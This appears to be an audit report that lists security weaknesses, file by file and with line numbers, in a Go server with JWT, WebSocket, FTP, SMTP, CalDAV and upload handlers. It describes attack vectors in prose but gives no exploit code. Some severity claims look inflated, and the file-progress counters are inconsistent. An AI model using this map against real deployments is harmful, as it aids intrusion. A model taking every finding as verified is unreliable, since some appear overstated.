### Attack Vectors Identified
- **Mass data exfiltration:** Use `GetAllObjects()` to extract entire table contents without authorization
- **Credential harvesting:** Enumerate and retrieve stored credentials without permission checks
- **Permission bypass:** Manipulate reference IDs to bypass authorization
- **Unauthorized action execution:** Execute privileged actions without proper authorization

---

## server/fakerservice/faker_test.go

### Security Issues - TEST COVERAGE GAPS
- **Global state dependency:** Test depends on global column manager initialization creating test isolation issues
- **Insufficient security test coverage:** Only validates presence of fake data, not security aspects
- **Information disclosure in logs:** Test logs all generated fake data values exposing patterns
- **No validation of fake data security:** No testing that fake data is safe for production use

### Missing Security Test Cases
- **No sensitive data pattern validation:** No check that fake data doesn't contain real sensitive information
- **No data format validation:** Missing validation of fake data format compliance
- **No resource exhaustion testing:** No testing of memory/performance limits with large datasets
- **No error condition testing:** Limited testing of edge cases and error scenarios

---

## server/fakerservice/faker.go

### Security Issues - FAKE DATA GENERATION
- **No input validation:** No validation of column specifications or limits - could cause resource exhaustion
- **Dependency on external generator:** Relies on `resource.ColumnManager.GetFakeData()` without error handling
- **Unvalidated data storage:** Stores fake data without validation or size limits
- **Memory management concerns:** No protection against resource abuse with large column sets

### Logic Issues
- **Predictable ID skipping:** Only skips exact "id" column name, other ID patterns might get fake data
- **Foreign key logic limitations:** Simple detection might miss complex relationship patterns
- **No error handling:** Fake data generation failures not handled gracefully

### Security Risks
- **Resource exhaustion:** Large column lists could cause memory exhaustion attacks
- **Data injection:** If fake data generator compromised, could inject malicious data
- **Type confusion:** Invalid column types might cause errors or unexpected behavior

---

## server/fsm/fsm_manager.go

### 🚨 CRITICAL SECURITY VULNERABILITIES - FSM SYSTEM
- **SQL injection (Lines 30-34, 98-100, 188-189):** Dynamic table name construction from user input without validation - **DATABASE COMPROMISE RISK**
- **Type assertion panics (Lines 68, 69, 151, 152):** Multiple unhandled type assertions can crash application
- **JSON deserialization without validation (Lines 130-133):** State machine events unmarshaled without size/structure limits - **JSON BOMB RISK**
- **State machine definition tampering:** No validation of state machine integrity loaded from database

### Attack Vectors Identified - FSM MANIPULATION
- **Table name injection:** Inject SQL through objType parameters in dynamic table construction
- **State definition injection:** Inject malicious state machine definitions into database  
- **Transition bypass:** Manipulate state transitions to bypass business logic
- **JSON bomb attacks:** Submit large JSON state machine definitions to exhaust memory
- **Resource exhaustion:** Exhaust database connections through repeated FSM operations

### Missing Security Controls
- **No input validation:** objType and other parameters not validated before SQL construction
- **No authorization checking:** State transitions executed without permission validation
- **No state machine validation:** State definitions loaded without integrity checking
- **Error information disclosure:** Detailed database errors exposed to users

---

## server/hostswitch/host_switch.go

### 🚨 CRITICAL SECURITY VULNERABILITIES - HTTP ROUTING
- **Host header injection (Line 42):** Direct use of Host header without validation for routing decisions - **CACHE POISONING & SSRF RISK**
- **Authentication bypass (Lines 50, 87):** Complex routing logic with potential bypass conditions through path manipulation
- **Type assertion panic (Lines 69, 98):** Unhandled type assertions can crash application
- **URL path traversal (Line 106):** Path reconstruction without validation enables directory traversal

### Attack Vectors Identified - ROUTING MANIPULATION
- **Host header attacks:** Cache poisoning and routing bypass through malicious Host headers
- **Path manipulation:** Craft URLs to bypass authentication and access restricted subsites
- **DNS rebinding attacks:** Exploit Host header trust for internal network access
- **Route enumeration:** Probe hostnames and paths to discover system structure

### Security Issues
- **Inconsistent error responses:** Different error messages reveal system behavior patterns
- **Default route security:** Dashboard access without proper authentication checks
- **Well-known path bypass:** Special .well-known handling bypasses normal authentication flow

---

## server/hostswitch/utils.go

### 🚨 CRITICAL TYPE ASSERTION VULNERABILITY
- **Type assertion panic (Line 44):** Unhandled type assertion `message[0].(string)` can crash application
- **Array bounds safety (Line 44):** Direct access to `message[0]` without bounds checking
- **Format string injection (Line 50):** User-controlled format strings passed to logging - **LOG INJECTION RISK**

### Security Issues - UTILITY VULNERABILITIES
- **No input validation:** String functions don't validate parameters for length or content
- **Error information leakage:** Sensitive details exposed in log messages without sanitization
- **Unicode handling gaps:** No validation for UTF-8 encoding or special characters

### Missing Security Controls
- **No parameter validation:** Functions accept arbitrary input without safety checks
- **No length limits:** String operations lack size restrictions
- **No format string sanitization:** Dangerous format specifiers not filtered

---

## server/id/id.go

### 🚨 CRITICAL MEMORY SAFETY VULNERABILITY
- **Unsafe pointer usage (Lines 9, 36, 37, 45):** Direct use of `unsafe.Pointer` in JSON encoding without bounds checking - **MEMORY CORRUPTION RISK**
- **Memory safety violation:** Could lead to segmentation faults, arbitrary memory access, or data corruption
- **Go memory safety bypass:** Violates Go's memory safety guarantees through unsafe operations

### Security Issues - REFERENCE ID SYSTEM
- **Type assertion vulnerabilities:** Multiple type assertions could cause unexpected behavior with malformed input
- **Input validation gaps:** Limited validation in JSON/binary unmarshaling methods
- **Silent failure patterns:** `InterfaceToDIR()` silently returns `NullReferenceId` on conversion failures masking errors
- **Error information disclosure:** Error messages include user-controlled input potentially enabling injection

### Attack Vectors Identified
- **Memory corruption attacks:** Exploit unsafe pointer operations to corrupt memory or access arbitrary memory locations
- **JSON bomb attacks:** Submit extremely large JSON strings for unmarshaling to exhaust memory
- **Reference ID manipulation:** Use null reference IDs to potentially bypass authorization checks
- **Type confusion attacks:** Send unexpected types to conversion functions to trigger error conditions

### Missing Security Controls
- **No input size limits:** JSON and string inputs not limited in size
- **No memory bounds checking:** Unsafe operations lack proper validation
- **Inconsistent error handling:** Mixed approaches to error handling across methods

---

## server/jwt/jwtmiddleware.go

### 🚨 CRITICAL JWT SECURITY VULNERABILITIES
- **Weak cryptographic hash (Lines 170-178):** MD5 usage for token caching keys - **CACHE POISONING RISK**
- **Type assertion panics (Lines 242, 280, 330):** Unhandled type assertions can crash application
- **JWT algorithm confusion (Lines 246-253):** Missing "none" algorithm protection - **AUTHENTICATION BYPASS RISK**
- **Information disclosure (Lines 207, 262):** JWT tokens logged in debug mode exposing credentials

### Attack Vectors Identified - JWT MANIPULATION
- **MD5 collision attacks:** Exploit weak MD5 hashing to poison token cache with colliding keys
- **Algorithm confusion attacks:** Use "none" algorithm to bypass signature validation if SigningMethod is nil
- **Cache poisoning:** Manipulate cache keys through crafted tokens to cause token confusion
- **Log mining:** Extract JWT tokens from debug logs for credential theft

### Security Issues - JWT IMPLEMENTATION
- **Commented security code:** Token caching implementation partially disabled creating inconsistent behavior
- **Cache key collisions:** Weak cache key generation enables cross-user token confusion
- **Weak token storage:** Tokens cached in plain text without encryption
- **Error information disclosure:** Detailed JWT parsing errors reveal implementation details

### Missing Security Controls
- **No algorithm allowlist:** Missing explicit rejection of dangerous algorithms like "none"
- **No token length validation:** Large tokens could cause memory exhaustion
- **No log sanitization:** Sensitive JWT data exposed in debug logs
- **No cache encryption:** Tokens stored in cache without additional security

---

**Last Updated:** File 45/176 analyzed (Jwt folder completed)  
**Next Review:** After completing all source analysis
---

## server/resource/encryption_decryption.go

### Critical Issues
- **Line 40:** Base64 Decode Error Ignored in Decryption - base64 decoding errors silently ignored using blank identifier, malformed input results in empty ciphertext
- **Lines 18, 42:** No Validation of Key Length or Quality - accepts any byte slice as encryption key without validation, could accept weak or empty keys leading to cryptographic failure
- **Lines 49-51:** Insufficient Ciphertext Length Validation - minimal validation allows edge case attacks, could accept IV-only input as valid ciphertext

### High Risk Issues
- **Lines 31, 55:** CFB Mode Stream Cipher Vulnerabilities - CFB mode vulnerable to bit-flipping attacks, no integrity protection to detect tampering
- **Line 14:** No Input Validation for Encryption Function - accepts empty/nil keys and unlimited text size, potential for resource exhaustion
- **Lines 58-60:** Potential Memory Disclosure in Decryption - in-place decryption leaves sensitive data in memory, could be recovered through memory dumps

### Security Concerns
- **Cryptographic weakness:** CFB mode without authentication vulnerable to tampering attacks  
- **Data integrity:** Silent failures and insufficient validation compromise data protection
- **Memory security:** Sensitive plaintext data remains in memory after decryption

### Attack Vectors
- **Bit-flipping attacks:** Exploit CFB mode vulnerability to modify ciphertext undetected
- **Key weakness exploitation:** Use weak or invalid keys to break encryption
- **Memory exploitation:** Extract sensitive data from memory after decryption
- **Base64 manipulation:** Exploit silent base64 decoding failures
- **Resource exhaustion:** Use large inputs to exhaust system resources

---

**Last Updated:** File 46/176 analyzed (Encryption module completed)  
**Next Review:** After completing all source analysis

---

## server/resource/middleware_objectaccess_permission.go

### Critical Issues
- **Lines 41, 58, 124, 140:** Unsafe Type Assertion Without Error Handling - type assertions can panic if types don't match expected interface, could crash permission middleware causing complete access control bypass
- **Line 226:** Information Disclosure Through Error Messages - sensitive information exposed in error messages including table name, user reference ID, and HTTP method details
- **Lines 58-62, 140-144:** Permission Check Bypass for Special Object Types - objects with "." or "_has_" in type name bypass all permission validation, could be exploited for unauthorized data access

### High Risk Issues
- **Lines 48-49, 133-134:** Cache Key Collision Vulnerability - reference ID used directly as cache key without context validation, could enable cross-object permission confusion
- **Lines 77, 167:** No Validation of Permission Results - permission check results not validated before use, could proceed with invalid permission data
- **Lines 181, 200:** URL-Based Logic for Relationship Permissions - security logic based on fragile URL pattern matching, could be bypassed with URL manipulation

### Security Concerns
- **Access control bypass:** Multiple critical vulnerabilities could compromise entire authorization system
- **Type safety:** Unsafe type assertions causing permission middleware crashes
- **Information disclosure:** Sensitive system details exposed in error messages
- **Permission confusion:** Cache collisions and inconsistent logic enabling unauthorized access

---

**Last Updated:** File 47/176 analyzed (Object access middleware completed)  
**Next Review:** After completing all source analysis

---

## server/resource/middleware_tableaccess_permission.go

### Critical Issues
- **Lines 40, 85:** Unsafe Type Assertion Without Error Handling - type assertions can panic if types don't match expected interface, could crash table permission middleware causing complete access control bypass
- **Lines 66, 104, 111, 116, 125, 130, 138, 143, 148:** Information Disclosure Through Error Messages - sensitive information exposed including table name, user reference ID, and HTTP method details in 403 error responses
- **Line 25:** Global Error Message Format Variable - global error format variable exposes system structure and could be modified by other parts of the system

### High Risk Issues
- **Lines 107, 121, 134:** URL-Based Logic for Relationship Permissions - security logic based on fragile URL pattern matching, could be bypassed with URL manipulation or encoding
- **Lines 47, 95:** No Validation of Permission Results - permission check results not validated before use, could proceed with invalid permission data
- **Lines 51, 58, 102:** Inconsistent Permission Methods for Same Operations - all operations use CanPeek method regardless of actual operation type, could enable unauthorized access

### Security Concerns
- **Access control bypass:** Multiple critical vulnerabilities could compromise entire table authorization system
- **Type safety:** Unsafe type assertions causing permission middleware crashes
- **Information disclosure:** Sensitive system details and user data exposed in error messages
- **Permission confusion:** Inconsistent permission logic enabling unauthorized access

---

**Last Updated:** File 48/176 analyzed (Table access middleware completed)  
**Next Review:** After completing all source analysis

---

## server/resource/dbresource.go

### Critical Issues
- **Line 57:** Unsafe Type Assertion Without Error Handling - type assertion can panic if types don't match expected interface, could crash core database resource initialization
- **Lines 319, 331:** Error Handling Ignored in Critical UUID Operations - UUID conversion errors silently ignored in security-critical operations, could enable privilege escalation through malformed UUID data
- **Lines 76, 134, 333:** Global CRUD_MAP Variable Access - global map variable accessible without protection, could enable unauthorized resource access through global map manipulation
- **Line 379:** Admin Privilege Checking Without Proper Validation - unsafe type assertion in admin email retrieval could panic if cached value is not string type

### High Risk Issues
- **Lines 272-305:** Binary Serialization Without Bounds Checking - binary serialization without validation or size limits could cause memory exhaustion with large admin maps
- **Lines 354-362:** Cache Operations Without Error Validation - cache operations with commented error handling may fail silently affecting authentication consistency
- **Lines 94, 375:** Hardcoded Administrator Group ID - administrator group ID hardcoded as "2" could break if database schema changes

### Security Concerns
- **Core system vulnerability:** Multiple critical vulnerabilities in the central database resource management system
- **Authentication bypass:** UUID handling errors and admin privilege checking could enable authentication bypass
- **Global state manipulation:** Unprotected global variables enabling unauthorized resource access
- **Resource exhaustion:** Binary serialization and cache operations without proper validation

---

**Last Updated:** File 49/176 analyzed (Core database resource completed)  
**Next Review:** After completing all source analysis

---

## server/database/database_connection_interface.go

### Medium Risk Issues
- **Lines 9-18:** No Input Validation Contracts in Interface - interface methods lack input validation specifications, could lead to inconsistent security validation across implementations
- **Lines 9, 12, 16:** Raw SQL Query Interface Without Safety Constraints - interface allows raw SQL queries without safety specifications, potential for SQL injection vulnerabilities

### Low Risk Issues
- **Lines 9, 10, 16:** Interface{} Type for Query Parameters - untyped interface{} parameters without validation guidance, type safety depends entirely on implementation
- **Lines 9-18:** No Error Handling Guidance - interface lacks error handling specifications, could lead to inconsistent error handling

### Security Concerns
- **Interface security:** Missing security validation requirements and implementation guidance
- **SQL injection potential:** No constraints on query construction or validation requirements
- **Type safety:** Untyped parameters without validation specifications

---

**Last Updated:** File 50/176 analyzed (Database interface completed)  
**Next Review:** After completing all source analysis

---

## server/websockets/web_socket_connection_handler.go

### Critical Issues
- **Lines 27, 38, 49, 75, 127, 170, 190-191, 213:** Unsafe Type Assertions Without Error Handling - multiple unsafe type assertions can panic if types don't match, could crash WebSocket service through malformed message payloads
- **Line 78:** Overly Permissive Default Permissions - default permission grants ALLOW_ALL_PERMISSIONS giving unrestricted access, could enable authorization bypass through default overly permissive permissions
- **Line 202:** UUID Conversion Error Ignored - UUID conversion error silently ignored in message publishing, could enable message attribution bypass through invalid UUID handling

### High Risk Issues
- **Lines 24-230:** No Authentication Validation for WebSocket Messages - WebSocket messages processed without authentication validation, could enable unauthorized WebSocket operations
- **Lines 65, 69:** Binary Deserialization Without Validation - binary and JSON deserialization without comprehensive validation, could enable deserialization attacks
- **Lines 126-151, 169-185:** Topic Management Without Authorization - topic management operations without proper authorization, could enable unauthorized topic manipulation

### Security Concerns
- **WebSocket security:** Multiple critical vulnerabilities in real-time communication system
- **Authorization bypass:** Default ALLOW_ALL permissions enabling complete authorization bypass
- **Resource exhaustion:** Unlimited subscriptions could cause denial of service
- **Authentication bypass:** No authentication validation for WebSocket operations

---

**Last Updated:** File 51/176 analyzed (WebSocket connection handler completed)  
**Next Review:** After completing all source analysis

---

## server/websockets/websocket_server.go

### Critical Issues
- **Lines 53-58:** Commented Authentication Code - authentication implementation completely commented out, no validation of client authentication before accepting WebSocket connections
- **Lines 74-78:** Unvalidated Message Broadcasting - messages broadcast to all clients without authorization checks, could enable unauthorized access to sensitive real-time data  
- **Lines 119-123:** No Connection Validation in Client Addition - clients added to server without authentication or authorization validation, could enable resource exhaustion

### High Risk Issues
- **Lines 100-103:** Error Information Disclosure - raw error messages sent directly to WebSocket clients could expose system internals
- **Lines 99-106, 119-121:** No Rate Limiting or Connection Limits - unlimited connections could enable denial of service through connection exhaustion
- **Lines 52-72:** Unprotected Server State Manipulation - server state manipulation methods without access control could enable unauthorized manipulation

### Security Concerns
- **Authentication bypass:** Complete authentication bypass for WebSocket connections
- **Information disclosure:** Uncontrolled message broadcasting could expose all real-time data
- **Resource exhaustion:** Unlimited connections enabling denial of service attacks
- **State manipulation:** Unprotected server state manipulation methods

---

**Last Updated:** File 57/176 analyzed (endpoint_caldav server completed)  
**Next Review:** After completing all source analysis


---

## server/endpoint_caldav.go

### Critical Issues
- **Line 16:** Hard-coded File System Path Exposure - hard-coded local directory path without access control validation, direct file system access with potential directory traversal
- **Lines 19-24:** Insufficient Authentication Validation - basic authentication without additional security controls, credential transmission in clear text and brute force susceptible
- **Lines 27-51:** Unrestricted WebDAV Operations - all WebDAV operations permitted without granular permission checks, unauthorized file manipulation and deletion

### High Risk Issues
- **Lines 27-51:** Wildcard Path Handling Without Validation - wildcard paths allow access to any file within WebDAV scope, potential access to unintended files
- **Lines 27-51:** Missing Rate Limiting - no protection against DoS attacks, resource exhaustion through request flooding
- **Line 14:** Commented Out Custom Storage Implementation - fallback to simple local file system instead of database integration, missing access control
- **Lines 18-26:** Shared Handler for Different Protocols - same authentication logic for CalDAV and CardDAV, potential cross-protocol access issues

### Security Concerns
- **Directory traversal:** Malicious paths enabling access to files outside CalDAV scope through path manipulation
- **Authentication bypass:** Basic authentication without rate limiting enabling brute force attacks on calendar/contact access
- **Data manipulation:** Unrestricted delete/move operations could corrupt or destroy calendar and contact data
- **Resource exhaustion:** Unlimited requests could overwhelm calendar services causing denial of service


---

## server/endpoint_no_route.go

### Critical Issues
- **Lines 43, 77:** Path Traversal Vulnerability - user-controlled file path used directly without validation, potential access to files outside intended directory structure
- **Line 82:** Unsafe Type Assertion Without Error Handling - type assertion could panic if file doesn't implement expected interface, service crash and denial of service
- **Lines 46, 124:** Cache Poisoning Through Unvalidated File Paths - user-controlled file paths used as cache keys without sanitization, cache poisoning and memory exhaustion

### High Risk Issues
- **Lines 84-87, 105-108:** Information Disclosure Through Error Messages - internal file system paths and error details exposed in logs, information leakage about server structure
- **Lines 94-100, 102-108:** Resource Exhaustion Through Large File Caching - no validation of cumulative cache size, memory exhaustion through large file accumulation
- **Lines 152-170:** Cache Headers Without Proper Validation - cache headers set without validation, potential cache poisoning and incorrect client behavior

### Security Concerns
- **Directory traversal:** Malicious paths enabling access to files outside intended directories through path manipulation
- **Service disruption:** Type assertion panics and resource exhaustion causing static file serving failures
- **Cache poisoning:** Unvalidated cache keys enabling manipulation of cached content and memory exhaustion
- **Information disclosure:** Error messages and file system structure exposure revealing sensitive server information


---

## server/endpoint_yjs.go

### Critical Issues
- **Lines 29-32, 65-70:** Authentication Bypass Through Type Assertion - type assertion without validation could panic if sessionUser is wrong type, enabling denial of service attacks
- **Lines 80-81:** UUID Parsing Without Error Handling - `uuid.MustParse` panics on invalid input, service crash through malformed reference IDs
- **Lines 82, 90:** Database Transaction Rollback Without Error Handling - transaction rollback errors ignored, could leave database resources locked

### High Risk Issues
- **Lines 101-102:** Unvalidated User Input in Room Name Generation - user-controlled typename and referenceId used without sanitization, potential room hijacking
- **Lines 96-99:** Permission Check Bypass Vulnerability - only checks update permission not read permission for collaborative editing, unauthorized document access
- **Lines 35, 104:** WebSocket Connection Without Rate Limiting - no rate limiting on connections, resource exhaustion through connection flooding
- **Lines 51-61:** Goroutine Resource Leak - infinite goroutine without cleanup mechanism, memory leak and resource exhaustion

### Security Concerns
- **Authorization bypass:** Weak permission checking enabling unauthorized document access in collaborative editing
- **Service disruption:** Type assertion panics and UUID parsing crashes causing WebSocket service failures
- **Resource exhaustion:** Unlimited connections and goroutine leaks causing system resource starvation
- **Room hijacking:** Predictable room names enabling unauthorized access to collaborative editing sessions


---

## server/endpoint_init.go

### Critical Issues
- **Lines 15, 37, 39:** Inconsistent Error Variable Usage - error checking logic error where `errb` is checked before assignment, could enable silent failures in critical database operations
- **Lines 23-33, 38-46, 48-67:** Transaction Resource Leaks - database transactions without proper cleanup patterns, could exhaust database connection pool
- **Lines 25-27, 49-52:** Missing Error Propagation - critical initialization errors don't stop the process, system starts in partially initialized state

### High Risk Issues  
- **Lines 63-67:** Transaction Commit Without Error Validation - commit/rollback errors not checked, could cause data consistency issues
- **Lines 54-62:** Multiple Database Operations Without Atomicity - only last operations check errors, earlier failures could be silent
- **Lines 12-13, 20-21, 55, 68:** Commented Out Critical Code - critical functionality disabled including concurrency protection and relationships

### Security Concerns
- **Resource exhaustion:** Transaction leaks could exhaust database connection pool causing denial of service
- **Data inconsistency:** Silent transaction failures could corrupt system state and enable security bypass
- **Partial initialization:** System starting in incomplete state could have missing security controls
- **Service disruption:** Initialization failures could prevent system startup entirely


---

## server/ftp_server.go

### Critical Issues
- **Lines 98-105:** External IP Address Exposure - public IP fetched from Amazon service and logged, enabling information disclosure and dependency on external service
- **Lines 82-83:** Unsafe Type Assertion Without Validation - type assertion on file interface can panic, could crash FTP server
- **Lines 269, 337, 361:** Hard-coded File Permissions - inconsistent file permissions (0750, 0600) without validation, potential privilege escalation
- **Lines 453-455:** HTTP Request to External Service - dependency on Amazon's checkip service creates SSRF risk and service availability issues

### High Risk Issues
- **Lines 216, 246, 258-259, 324-325:** Path Traversal Vulnerabilities - insufficient path validation in file operations, could enable unauthorized file system access
- **Lines 134-145, 175-181:** Database Transaction Resource Leaks - transactions without proper cleanup patterns, could exhaust database connections
- **Lines 187-189:** Password Validation Without Rate Limiting - bcrypt password checking without rate limiting, enabling brute force attacks
- **Lines 161, 224, 276, 346:** Excessive Debug Information - file paths and operations logged, information disclosure in production

### Security Concerns
- **Directory traversal:** Malicious path manipulation could access files outside intended directories
- **Authentication bypass:** Brute force attacks on FTP credentials without rate limiting
- **Service disruption:** Type assertion panics and resource leaks causing FTP service crashes
- **Information disclosure:** Debug logging and external IP fetching revealing sensitive server information


---

## server/server.go

### Critical Issues
- **Line 191:** Ignored Error in JSON Unmarshaling - JSON unmarshaling error for rate configuration ignored, could enable rate limiting bypass through configuration corruption
- **Lines 41-42, 75-77:** Global Variable Exposure - TaskScheduler and Stats variables globally accessible without access control, could enable unauthorized system manipulation
- **Lines 226-231:** Hardcoded Secret Generation - JWT secret generation using UUID without proper cryptographic randomness validation, could enable token compromise
- **Lines 127-129, 338-340:** Panic in Error Handling - application panic in database transaction handling, could crash entire server on database connection issues
- **Lines 450, 480, 596:** Silent Transaction Rollback - database transaction rollback errors ignored, could leave system in inconsistent state

### High Risk Issues  
- **Lines 177-181, 194-197:** Weak Default Configuration Values - default connection limits and rate configuration may be too permissive, could enable resource exhaustion
- **Lines 595-600:** Admin Detection Without Validation - admin email logged without validation, potential information disclosure and admin bypass
- **Lines 354-366:** Service Initialization Without Error Validation - SMTP server startup failures only logged, could leave system in degraded security state
- **Lines 512-520:** Database Connection Without Validation - ping endpoint exposes database connection errors, could provide information about database state

### Security Concerns
- **Configuration corruption:** Rate limiting bypass through malformed JSON configuration
- **Global state manipulation:** Unauthorized access to critical system components through global variables  
- **Secret prediction:** Weak JWT secret generation enabling token compromise and authentication bypass
- **Service disruption:** Application crashes and degraded security state through improper error handling


---

## server/config_handler.go

### Critical Issues
- **Line 18:** Unsafe Type Assertion Without Error Handling - type assertion can panic if user context contains unexpected type, could crash configuration handling for all requests
- **Line 41:** Information Disclosure Through Complete Configuration Exposure - complete system configuration exposed through single API call including secrets
- **Lines 67, 88:** Unrestricted Configuration Modification - any configuration value can be modified without validation, could enable system compromise
- **Lines 62, 83:** Raw Data Processing Without Validation - raw HTTP request data processed without validation, could enable resource exhaustion

### High Risk Issues
- **Lines 103-107:** Configuration Deletion Without Backup - configuration values can be permanently deleted without backup, could cause system instability
- **Lines 69, 90, 105:** Error Information Disclosure - internal error details exposed through HTTP responses, could reveal system structure
- **Line 34:** Logging of Sensitive Information - user reference IDs logged for configuration access without sanitization

### Security Concerns
- **Type confusion:** Type assertion panic enabling denial of service through malformed user context
- **Information disclosure:** Complete configuration exposure revealing all system secrets and credentials
- **Configuration manipulation:** Unrestricted modification of critical security settings enabling system compromise
- **Resource exhaustion:** Unvalidated input processing enabling DoS through large payloads


---

## server/handlers.go

### Critical Issues
- **Lines 23, 52, 131, 142, 144, 145, 165, 186:** Unsafe Type Assertion Without Error Handling - multiple unsafe type assertions can panic if types don't match, could crash state machine handling
- **Line 142:** Missing JSON Import for Unmarshaling - JSON package not imported but used for unmarshaling, code compilation failure
- **Lines 134-145:** Binary Data Processing Without Validation - request body processed without size limits or validation, could enable resource exhaustion
- **Lines 71-74, 176-179:** State Machine Permission Bypass - permission check could be bypassed if sessionUser is nil, enabling unauthorized operations

### High Risk Issues
- **Lines 39, 79, 113, 136, 161, 183, 201:** Information Disclosure Through Error Messages - internal error details exposed to clients through HTTP responses
- **Lines 104-111:** SQL Injection Risk Through Direct Query Building - dynamic SQL construction with user-controlled typename, could enable SQL injection
- **Line 193:** Hardcoded Permission Values - hardcoded permission values for new state machines may grant inappropriate permissions

### Security Concerns
- **Type confusion:** Multiple type assertion vulnerabilities could crash state machine service
- **Authorization bypass:** Permission bypass enabling unauthorized state machine manipulation
- **State corruption:** SQL injection and unsafe operations could compromise business logic integrity
- **Resource exhaustion:** Binary data processing without limits enabling DoS attacks


---

## server/smtp_server.go

### Critical Issues
- **Lines 59, 63, 68:** Insecure File Permissions for Private Keys - private keys and certificates written with world-readable permissions (0666), enabling certificate theft
- **Lines 26-27:** Temporary Directory Without Secure Cleanup - temporary certificate files created without secure cleanup mechanism, certificates persist
- **Lines 35-42:** Unsafe Type Assertions Without Error Handling - type assertions and conversions can panic with malformed database data
- **Line 107:** Hardcoded Authentication Configuration - only LOGIN authentication method hardcoded, credentials transmitted in easily decoded base64

### High Risk Issues
- **Lines 45-47, 61-62, 64-66, 71-73:** Error Handling Without Proper Validation - certificate generation errors only logged, SMTP server continues with invalid certificates
- **Lines 46, 61, 65, 72, 111:** Information Disclosure in Logs - sensitive server configuration exposed in logs including hostnames
- **Line 116:** Wildcard Host Configuration - wildcard host allows connections to any hostname, enabling mail relay attacks

### Security Concerns
- **Certificate security:** World-readable private keys and insecure temporary storage enabling complete compromise
- **Authentication weakness:** Weak LOGIN authentication enabling credential interception
- **Mail relay abuse:** Wildcard configuration enabling unauthorized mail relay attacks  
- **Service disruption:** Type assertion panics and malformed configuration causing SMTP service crashes


---

## server/asset_upload_handler.go

### Critical Issues
- **Line 102:** Unsafe Type Assertion Without Error Handling - type assertion can panic if user context contains unexpected type, could crash asset upload handling
- **Lines 57, 286, 590, 613:** Directory Traversal Through Filename Parameter - unvalidated filename parameter enables directory traversal attacks and arbitrary file upload
- **Lines 579-581:** Credentials Exposed in Configuration Management - cloud storage credentials written to global rclone configuration, enabling credential theft
- **Lines 161-164, 301, 343:** Unrestricted File Upload Without Size or Type Validation - no validation of file size, type, or content enabling resource exhaustion and malicious uploads

### High Risk Issues
- **Lines 203, 238, 257, 466, 468-474:** Information Disclosure Through Error Messages - detailed error information exposed including S3 bucket names and internal paths
- **Line 289:** Insecure File Permissions for Local Storage - directories created with permissive permissions (0755) enabling unauthorized access
- **Lines 161, 369, 624, 631:** Missing Input Validation for Upload Parameters - parsing errors ignored and no validation of parameter values
- **Lines 171, 213:** Hardcoded Multipart Upload Thresholds - fixed thresholds may not suit all environments or security policies

### Security Concerns
- **Directory traversal:** Filename manipulation enabling arbitrary file upload outside intended directories
- **Credential exposure:** Cloud storage credentials accessible through global configuration state
- **Resource exhaustion:** Unlimited file uploads without size or type restrictions enabling DoS attacks
- **Information disclosure:** Detailed error messages revealing system internals and storage configuration
